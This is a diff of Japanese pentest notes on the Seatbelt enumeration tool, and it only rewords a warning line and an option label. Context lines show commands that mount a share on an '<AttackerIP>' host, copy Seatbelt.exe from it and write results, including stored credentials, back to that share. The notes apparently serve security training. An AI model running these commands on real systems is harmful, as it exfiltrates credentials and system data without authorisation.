@@ -15,7 +15,7 @@
 
 >[!WARNING]
 > - 過検知や見逃しの可能性を常に考慮する
-> - 手動でしか発見できないようなそのターゲットシステム独自の構成は自動化ツールでは発見できない
+> - 手動でしか発見できないようなターゲットシステム独自の構成は自動化ツールでは発見できない
 
 ## 実行コマンド
 
@@ -36,7 +36,7 @@ net use \\<AttackerIP>\share /user:username pw
 cp \\<AttackerIP>\share\Seatbelt.exe .
 .\Seatbelt.exe -group=all | Tee-Object -FilePath \\<AttackerIP>\share\seatbelt_result.txt
 ```
-- `-group`引数に取れる値の一部：
+- `-group`オプションの引数例：
 	- `all`：全てのチェックを実行（非常に量が多い）
 	- `system`：OSの設定、パッチ状況、サービスなどのシステム情報を調査
 	- `user`：ユーザーごとの設定、保存された認証情報、履歴などを調査
